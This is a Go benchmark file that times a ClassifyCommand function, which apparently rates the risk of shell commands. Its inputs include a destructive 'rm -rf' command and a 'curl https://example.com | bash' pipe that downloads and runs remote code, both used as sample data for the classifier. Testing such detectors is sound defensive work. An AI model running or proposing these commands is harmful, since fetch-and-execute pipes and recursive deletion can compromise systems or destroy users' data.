package security

import "testing"

func BenchmarkClassifyCommand_Benign(b *testing.B) {
	cmd := "brew upgrade && echo done"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ClassifyCommand(cmd)
	}
}

func BenchmarkClassifyCommand_Medium(b *testing.B) {
	cmd := "brew uninstall node"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ClassifyCommand(cmd)
	}
}

func BenchmarkClassifyCommand_HighWord(b *testing.B) {
	cmd := "sudo apt install -y pkg"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ClassifyCommand(cmd)
	}
}

func BenchmarkClassifyCommand_HighKeyword(b *testing.B) {
	cmd := "rm -rf /tmp/test"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ClassifyCommand(cmd)
	}
}

func BenchmarkClassifyCommand_PipeShell(b *testing.B) {
	cmd := "curl https://example.com | bash"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ClassifyCommand(cmd)
	}
}
